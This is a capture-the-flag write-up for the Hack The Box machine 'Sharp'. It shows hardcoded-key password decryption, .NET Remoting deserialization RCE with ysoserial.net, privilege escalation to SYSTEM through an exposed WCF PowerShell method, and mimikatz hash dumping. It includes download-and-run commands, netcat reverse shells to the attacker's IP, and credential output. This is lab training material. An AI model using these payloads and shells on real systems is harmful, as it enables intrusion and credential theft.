---
icon: paw
cover: ../../../../.gitbook/assets/Screenshot 2026-03-13 100135.png
coverY: 21.07962023219874
---

# HTB-SHARP

## Reconnaissance

Kicked things off with rustscan to get a fast port list, then handed interesting ports to nmap for service detection.

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Sharp]
└─$ rustscan -a 10.10.10.219 blah blah
```

```
Open 10.10.10.219:135
Open 10.10.10.219:139
Open 10.10.10.219:445
Open 10.10.10.219:5985
Open 10.10.10.219:8888
Open 10.10.10.219:8889

PORT     STATE SERVICE            VERSION
135/tcp  open  msrpc              Microsoft Windows RPC
139/tcp  open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
5985/tcp open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
8888/tcp open  storagecraft-image StorageCraft Image Manager
8889/tcp open  mc-nmf             .NET Message Framing
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2025-03-13T08:24:15
|_  start_date: N/A
```

Standard Windows ports (135, 139, 445, 5985) are whatever — been there, done that. What catches my eye immediately are 8888 and 8889. Nmap's guessing "StorageCraft Image Manager" and ".NET Message Framing" which are both wrong labels, but the `.NET Message Framing` tag on 8889 is a hint. Whatever's running here is .NET-based. Keep that in mind.

***

### Enumeration

#### RPC — Port 135

Quick null session attempt, standard procedure:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Sharp]
└─$ rpcclient -U "" -N 10.10.10.219
```

```
rpcclient $> srvinfo
        10.10.10.219   Wk Sv NT SNT
        platform_id     :       500
        os version      :       10.0
        server type     :       0x9003
```

Anonymous logon works but basically gives us nothing useful. OS version 10.0 confirms Windows 10/Server 2019. Every other rpcclient command gets access denied. Move on.

***

#### SMB — Port 445

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Sharp]
└─$ smbmap -H 10.10.10.219
```

```
[+] IP: 10.10.10.219:445        Name: 10.10.10.219
        Disk                    Permissions     Comment
        ----                    -----------     -------
        ADMIN$                  NO ACCESS       Remote Admin
        C$                      NO ACCESS       Default share
        dev                     NO ACCESS
        IPC$                    NO ACCESS       Remote IPC
        kanban                  READ ONLY
```

Two shares of interest — `dev` (no access yet) and `kanban` (anonymous read). Let's get into `kanban` first.

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Sharp]
└─$ smbclient -U "" -N //10.10.10.219/kanban/
```

```
smb: \> ls
  CommandLine.dll
  CsvHelper.dll
  DotNetZip.dll
  Files/
  Itenso.Rtf.*.dll   [multiple]
  MsgReader.dll
  Ookii.Dialogs.dll
  pkb.zip
  Plugins/
  PortableKanban.cfg
  PortableKanban.Data.dll
  PortableKanban.exe
  PortableKanban.Extensions.dll
  PortableKanban.pk3
  PortableKanban.pk3.bak
  PortableKanban.pk3.md5
  ServiceStack.*.dll   [multiple]
  User Guide.pdf

  10357247 blocks of size 4096. 7406191 blocks available
```

This is the full installation directory of an app called **PortableKanban** — a local task/project management tool. Bunch of DLLs (plugins), the executable itself, and most interestingly a `.pk3` file which turns out to be where user data lives. Let's pull everything down.

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Sharp]
└─$ smbclient -U "" -N //10.10.10.219/kanban/
smb: \> tarmode
smb: \> recurse
smb: \> prompt
smb: \> mget ./
```

***

#### Cracking PortableKanban Credentials

The `.pk3` file is just JSON. Pop it open:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Sharp]
└─$ cat PortableKanban.pk3 | python3 -m json.tool | grep -A10 '"Users"'
```

```json
"Users": [
  {
    "Id": "e8e29158d70d44b1a1ba4949d52790a0",
    "Name": "Administrator",
    "EncryptedPassword": "k+iUoOvQYG98PuhhRC7/rg==",
    "Role": "Admin"
  },
  {
    "Id": "0628ae1de5234b81ae65c246dd2b4a21",
    "Name": "lars",
    "EncryptedPassword": "Ua3LyPFM175GN8D3+tqwLA==",
    "Role": "User"
  }
]
```

Encrypted passwords, base64-padded. Could be a bunch of things. Time to crack open `PortableKanban.Data.dll` in **dnSpy** and see how encryption is actually implemented.

Navigate to the `Crypto` class in the decompiled output. Here's what we find:

```csharp
// PortableKanban.Data.dll → Crypto.cs
private static byte[] _rgbKey = Encoding.ASCII.GetBytes("7ly6UznJ");
private static byte[] _rgbIV  = Encoding.ASCII.GetBytes("XuVUm5fR");

public static string Decrypt(string cryptedString)
{
    DESCryptoServiceProvider des = new DESCryptoServiceProvider();
    return new StreamReader(
        new CryptoStream(
            new MemoryStream(Convert.FromBase64String(cryptedString)),
            des.CreateDecryptor(_rgbKey, _rgbIV),
            CryptoStreamMode.Read
        )
    ).ReadToEnd();
}
```

DES encryption, hardcoded key `7ly6UznJ` and IV `XuVUm5fR`. Both baked into the binary. This is hilariously bad — not just weak crypto (DES hasn't been safe since the 90s), but the key is literally sitting in plaintext in the assembly. Anyone with a decompiler gets it in 30 seconds.

Decrypt with CyberChef: `DES Decrypt → ECB mode → key: 7ly6UznJ → IV: XuVUm5fR` on the base64-decoded blobs. Or just write it in Python:

```python
# decrypt_pk.py
from Crypto.Cipher import DES
import base64

key = b"7ly6UznJ"
iv  = b"XuVUm5fR"

hashes = {
    "Administrator": "k+iUoOvQYG98PuhhRC7/rg==",
    "lars":          "Ua3LyPFM175GN8D3+tqwLA=="
}

for user, enc in hashes.items():
    ct = base64.b64decode(enc)
    cipher = DES.new(key, DES.MODE_CBC, iv)
    print(f"{user}: {cipher.decrypt(ct).decode().rstrip()}")
```

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Sharp]
└─$ python3 decrypt_pk.py
```

```
Administrator: G2@$btRSHJYTarg
lars: G123HHrth234gRG
```

Two plaintext passwords. Now let's see what we can actually do with them.

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Sharp]
└─$ crackmapexec winrm 10.10.10.219 -u administrator -p 'G2@$btRSHJYTarg'
```

```
[-] Sharp\administrator:G2@$btRSHJYTarg
```

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Sharp]
└─$ crackmapexec winrm 10.10.10.219 -u lars -p 'G123HHrth234gRG'
```

```
[-] Sharp\lars:G123HHrth234gRG
```

WinRM denies both. But SMB as lars?

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Sharp]
└─$ crackmapexec smb 10.10.10.219 -u lars -p 'G123HHrth234gRG' --shares
```

```
[+] Sharp\lars:G123HHrth234gRG
Share           Permissions     Remark
-----           -----------     ------
ADMIN$                          Remote Admin
C$                              Default share
dev             READ
IPC$            READ            Remote IPC
kanban
```

lars has read access to `dev` now. That's new. The `dev` share was completely locked before with anonymous creds.

***

#### SMB /dev — Finding the .NET Remoting Endpoint

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Sharp]
└─$ smbclient //10.10.10.219/dev -U 'lars%G123HHrth234gRG'
```

```
smb: \> ls
  Client.exe          A     5632  Sun Nov 15 20:55:01 2020
  notes.txt           A       70  Sun Nov 16 00:29:02 2020
  RemotingLibrary.dll A     4096  Sun Nov 15 20:55:01 2020
  Server.exe          A     6144  Mon Nov 16 22:25:44 2020
```

```bash
smb: \> mget ./*
```

First thing, check the notes:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Sharp]
└─$ cat notes.txt
```

```
Todo:
    Migrate from .Net remoting to WCF
    Add input validation
```

Two things pop out here: they're still running **.NET Remoting** (which is deprecated and notoriously exploitable), and input validation is explicitly _not yet done_. That's basically a neon sign saying "please attack me."

Time to crack open those binaries.

**Server.exe** in dnSpy:

```csharp
// Server.exe → StartServer()
Hashtable hashtable = new Hashtable();
hashtable["port"] = 8888;
hashtable["rejectRemoteRequests"] = false;  // <-- accepts remote connections

BinaryServerFormatterSinkProvider provider = new BinaryServerFormatterSinkProvider();
provider.TypeFilterLevel = TypeFilterLevel.Full;  // <-- deserialization unrestricted

ChannelServices.RegisterChannel(new TcpChannel(hashtable, ..., provider), true);
RemotingConfiguration.CustomErrorsMode = CustomErrorsModes.Off;
RemotingConfiguration.RegisterWellKnownServiceType(
    typeof(Remoting),
    "SecretSharpDebugApplicationEndpoint",
    WellKnownObjectMode.Singleton
);
```

`TypeFilterLevel.Full` is the critical line. With Full filter level, the .NET remoting channel will deserialize _any_ type — including gadget chains used in deserialization attacks. This is what makes it exploitable.

**Client.exe** in dnSpy:

```csharp
// Client.exe → Main()
ChannelServices.RegisterChannel(new TcpChannel(), true);
IDictionary props = ChannelServices.GetChannelSinkProperties(
    (Remoting)Activator.GetObject(
        typeof(Remoting),
        "tcp://localhost:8888/SecretSharpDebugApplicationEndpoint"  // endpoint
    )
);
props["username"] = "debug";
props["password"] = "SharpApplicationDebugUserPassword123!";
```

Debug credentials hardcoded in the binary. Endpoint confirmed: `tcp://10.10.10.219:8888/SecretSharpDebugApplicationEndpoint`.

***

### Exploitation — .NET Remoting Deserialization RCE

#### What's happening here

.NET Remoting is a legacy IPC mechanism replaced by WCF. When `TypeFilterLevel` is set to `Full`, the channel deserializes incoming objects without restriction. This maps to **CVE-2014-1806** / **CVE-2014-4149** — deserialization gadget chains against .NET BinaryFormatter. The tool that handles this for us is [ExploitRemotingService](https://github.com/tyranid/ExploitRemotingService) by James Forshaw combined with **ysoserial.net** for payload generation.

#### Payload Generation

Building the serialized payload with ysoserial.net. The `TypeConfuseDelegate` gadget works here since BinaryFormatter with Full TypeFilter doesn't restrict which types get instantiated during deserialization:

```powershell
# On Windows VM — generate payload to download nc64.exe
PS C:\tools> .\ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -o base64 `
  -c "powershell -c iwr http://10.10.14.14/nc64.exe -outfile C:\programdata\nc64.exe -usebasicparsing"
```

```
AAEAAAD/////AQAAAAAAAAA....[base64 blob]
```

Hosting nc64.exe on a Python server:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Sharp]
└─$ python3 -m http.server 80
```

Sending the payload through ExploitRemotingService (run from a Windows session with lars' creds cached via `runas /netonly`):

```powershell
PS C:\tools> .\ExploitRemotingService.exe `
  --user=debug `
  --pass="SharpApplicationDebugUserPassword123!" `
  -s tcp://10.10.10.219:8888/SecretSharpDebugApplicationEndpoint `
  raw AAEAAAD/////AQAAAAAA...
```

```
System.InvalidCastException: Unable to cast object of type 
'System.Collections.Generic.SortedSet`1[System.String]' to type 
'System.Runtime.Remoting.Messaging.IMessage'.
```

This error is expected and totally fine — it means the BinaryFormatter ran the gadget chain before trying to cast the result to an IMessage. The deserialization triggered, the command ran. Watch the Python server:

```
::ffff:10.10.10.219 - - [13/Mar/2025 09:34:32] "GET /nc64.exe HTTP/1.1" 200 -
```

nc64.exe landed on the box. Now second payload to get a shell:

```powershell
PS C:\tools> .\ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -o base64 `
  -c "C:\programdata\nc64.exe -e powershell 10.10.14.14 443"

PS C:\tools> .\ExploitRemotingService.exe `
  --user=debug `
  --pass="SharpApplicationDebugUserPassword123!" `
  -s tcp://10.10.10.219:8888/SecretSharpDebugApplicationEndpoint `
  raw AAEAAAD/////AQAAAAAA...
```

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Sharp]
└─$ nc -lvnp 443
```

```
listening on [any] 443 ...
connect to [10.10.14.14] from (UNKNOWN) [10.10.10.219] 49690

PS C:\Windows\system32> whoami
sharp\lars
```

Shell as lars.

```bash
PS C:\Users\lars\Desktop> type user.txt
198547b7************************
```

***

### Privilege Escalation — WCF Endpoint Abuse

#### Enumeration as lars

```powershell
PS C:\Users\lars\Documents> ls
```

```
Directory: C:\Users\lars\Documents

Mode    LastWriteTime   Name
----    -------------   ----
d-----  11/15/2020      wcf
```

The `notes.txt` from earlier mentioned migrating from .NET Remoting to WCF. lars has an entire WCF Visual Studio project sitting in his Documents. Let's grab it.

```powershell
PS C:\Users\lars\Documents> Compress-Archive -Path wcf -DestinationPath C:\dev\wcf.zip
```

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Sharp]
└─$ smbclient //10.10.10.219/dev -U 'lars%G123HHrth234gRG' -c "get wcf.zip"
```

Unzip locally and open in Visual Studio.

***

#### Reversing the WCF Project

The solution has three projects: `Client`, `Server`, `RemotingLibrary`.

**Server's `OnStart()`:**

```csharp
Uri baseAddress = new Uri("net.tcp://0.0.0.0:8889/wcf/NewSecretWcfEndpoint");
serviceHost = new ServiceHost(typeof(Remoting), baseAddress);

NetTcpBinding binding = new NetTcpBinding();
binding.Security.Mode = SecurityMode.Transport;
binding.Security.Transport.ClientCredentialType = TcpClientCredentialType.Windows;
```

Port 8889 confirmed, Windows authentication — so it'll only accept connections from valid Windows accounts. That's why we couldn't just hit it directly from Linux.

**RemotingLibrary's `Remoting` class:**

```csharp
public string GetDiskInfo() { ... }
public string GetCpuInfo()  { ... }
public string GetRamInfo()  { ... }
public string GetUsers()    { ... }  // unused in client

public string InvokePowerShell(string scriptText)  // unused in client — this is it
{
    Runspace runspace = RunspaceFactory.CreateRunspace();
    runspace.Open();
    Pipeline pipeline = runspace.CreatePipeline();
    pipeline.Commands.AddScript(scriptText);
    pipeline.Commands.Add("Out-String");
    Collection<PSObject> results = pipeline.Invoke();
    runspace.Close();
    // ...
    return stringBuilder.ToString();
}
```

`InvokePowerShell` is defined in the library and exposed by the server interface, but never called from the client. The WcfServer process (PID 756 in the process list) is running as SYSTEM — which means if we call this method, PowerShell runs as SYSTEM.

Verify the server is actually running:

```powershell
PS C:\> netstat -nao | findstr 8889
TCP    0.0.0.0:8889   0.0.0.0:0   LISTENING   756

PS C:\> Get-Process -Id 756
Handles  NPM   PM    WS    Id  ProcessName
-------  ---   --    --    --  -----------
293      20    16128 20452 756 WcfServer
```

Yep, it's alive. Now we just need to compile a modified client that calls `InvokePowerShell`.

***

#### Compiling the Modified Client

Modify `Program.cs` in the Client project. Change the endpoint from `localhost` to the target IP (so we can test from our VM with lars' creds), and add the PowerShell call:

```csharp
public static void Main()
{
    ChannelFactory<IWcfService> channelFactory = new ChannelFactory<IWcfService>(
        new NetTcpBinding(SecurityMode.Transport),
        "net.tcp://localhost:8889/wcf/NewSecretWcfEndpoint"  // keep localhost — run on box
    );
    IWcfService client = channelFactory.CreateChannel();
    Console.WriteLine(client.InvokePowerShell(
        "C:\\programdata\\nc64.exe -e powershell 10.10.14.14 9001"
    ));
}
```

Build → Release. You get `WcfClient.exe` + `WcfRemotingLibrary.dll`. Both need to be uploaded to the box since the DLL has the interface definitions.

```powershell
# On the lars shell
PS C:\programdata> certutil -urlcache -split -f "http://10.10.14.14/WcfClient.exe" WcfClient.exe
PS C:\programdata> certutil -urlcache -split -f "http://10.10.14.14/WcfRemotingLibrary.dll" WcfRemotingLibrary.dll
```

```
::ffff:10.10.10.219 - - [13/Mar/2025 10:14:36] "GET /WcfClient.exe HTTP/1.1" 200 -
::ffff:10.10.10.219 - - [13/Mar/2025 10:14:38] "GET /WcfRemotingLibrary.dll HTTP/1.1" 200 -
```

Start the listener:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Sharp]
└─$ nc -lvnp 9001
```

Run the client on the box from the lars shell:

```powershell
PS C:\programdata> .\WcfClient.exe
```

```
listening on [any] 9001 ...
connect to [10.10.14.14] from (UNKNOWN) [10.10.10.219] 49764

PS C:\Windows\system32> whoami
nt authority\system

PS C:\Windows\system32> whoami /groups | findstr "Mandatory"
Mandatory Label\System Mandatory Level   Label   S-1-16-16384
```

SYSTEM shell. The WcfServer was running with SYSTEM privileges, and we just asked it to run our command for us. Completely legitimate from its perspective — we authenticated as lars (a Windows user it accepts), called a method it exposes, and it ran our code.

***

### Bonus - Interactive WCF Shell

Since we have an arbitrary PowerShell execution primitive through `InvokePowerShell`, we can build a proper interactive loop instead of just a one-shot reverse shell. The WcfClient.exe dies after the shell closes anyway (process timeout), so a loop is cleaner for enumeration:

```csharp
public static void Main()
{
    ChannelFactory<IWcfService> cf = new ChannelFactory<IWcfService>(
        new NetTcpBinding(SecurityMode.Transport),
        "net.tcp://localhost:8889/wcf/NewSecretWcfEndpoint"
    );
    IWcfService client = cf.CreateChannel();
    while (true)
    {
        Console.Write("PS> ");
        string cmd = Console.ReadLine();
        Console.Write(client.InvokePowerShell(cmd));
    }
}
```

Upload and run. Each command you type gets executed as SYSTEM and output comes back inline. Janky, but effective for grabbing files without needing a stable reverse shell.

***

### Persistence - NTLM Hash Dump

Since we have SYSTEM, might as well grab the hashes:

```powershell
PS> .\mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam" "exit"
```

```
Domain : SHARP
SysKey : 16d3cbceb100e487ba2614447fede88d

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: 9e2ede4a0c81d4ca7630ef1e8d30afb7

RID  : 000003ee (1006)
User : debug
  Hash NTLM: 6c7d1f972008d581e788e7c24585d2bf

RID  : 000003ef (1007)
User : lars
  Hash NTLM: e5852e8163e71de86599596375a22e5c
```

Administrator NTLM: `9e2ede4a0c81d4ca7630ef1e8d30afb7`. Could use this for pass-the-hash if needed.

***

### Attack Flow

```
[Anonymous SMB Read: /kanban]
          │
          ▼
[PortableKanban.Data.dll → DES key/IV hardcoded]
          │
          ▼
[Decrypt .pk3 passwords → lars:G123HHrth234gRG]
          │
          ▼
[SMB /dev (read as lars) → Client.exe + Server.exe]
          │
          ▼
[RE Client.exe → debug:SharpApplicationDebugUserPassword123!
               → tcp://10.10.10.219:8888/SecretSharpDebugApplicationEndpoint]
          │
          ▼
[.NET Remoting BinaryFormatter deserialization (TypeFilterLevel=Full)]
[ysoserial.net TypeConfuseDelegate gadget → RCE as lars]
          │
          ▼
[user.txt → lars]
          │
          ▼
[Enumerate Documents → WCF Visual Studio project]
          │
          ▼
[RE RemotingLibrary.dll → InvokePowerShell() exposed on port 8889]
[WcfServer running as SYSTEM, Windows auth accepts lars]
          │
          ▼
[Compile modified WcfClient.exe → call InvokePowerShell()]
[Upload + execute on box → nc callback as NT AUTHORITY\SYSTEM]
          │
          ▼
[root.txt → Administrator desktop]
```

***

### Techniques

| Technique                         | Tool / Method                              | Notes                                                          |
| --------------------------------- | ------------------------------------------ | -------------------------------------------------------------- |
| SMB anonymous enumeration         | `smbmap`, `smbclient`                      | Anonymous read on `/kanban`                                    |
| .NET assembly RE                  | dnSpy                                      | Decompile DLLs and EXEs                                        |
| DES decryption (hardcoded key)    | Python `pycryptodome` / CyberChef          | Key+IV baked into `PortableKanban.Data.dll`                    |
| .NET Remoting deserialization RCE | `ExploitRemotingService` + `ysoserial.net` | CVE-2014-1806 / CVE-2014-4149, requires `TypeFilterLevel=Full` |
| BinaryFormatter gadget chain      | ysoserial.net `TypeConfuseDelegate`        | Works when Full TypeFilter is set                              |
| WCF method abuse                  | Custom compiled `WcfClient.exe`            | Calls `InvokePowerShell()` on SYSTEM-level WcfServer           |
| File transfer                     | `certutil -urlcache`, Python HTTP server   | Upload compiled binaries to victim                             |
| NTLM hash dump                    | `mimikatz lsadump::sam`                    | Post-exploitation persistence                                  |

***

<figure><img src="../../../../.gitbook/assets/complete (38).gif" alt=""><figcaption></figcaption></figure>
